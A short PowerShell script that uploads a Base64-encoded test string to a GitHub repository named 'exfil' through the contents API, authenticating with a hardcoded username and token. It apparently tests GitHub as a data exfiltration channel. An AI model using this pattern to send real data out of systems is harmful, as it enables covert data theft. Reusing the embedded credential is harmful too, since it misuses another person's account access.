$Token = 'nnh100:eb1d2888bed6b7c01fef32ea0ce8fe5b13e4dc39'
$Base64Token = [System.Convert]::ToBase64String([char[]]$Token);
$Headers = @{
    Authorization = 'Basic {0}' -f $Base64Token;
};

$data = "this is a test"

$Body = @{
    path = 'testfile3'
    content = [System.Convert]::ToBase64String([char[]]$data);
    encoding = 'base64';
    message = "test commit";
} | ConvertTo-Json;

$content = Invoke-RestMethod -Headers $Headers -Uri https://api.github.com/repos/nnh100/exfil/contents/testfolder/testfile3 -Body $Body -Method Put
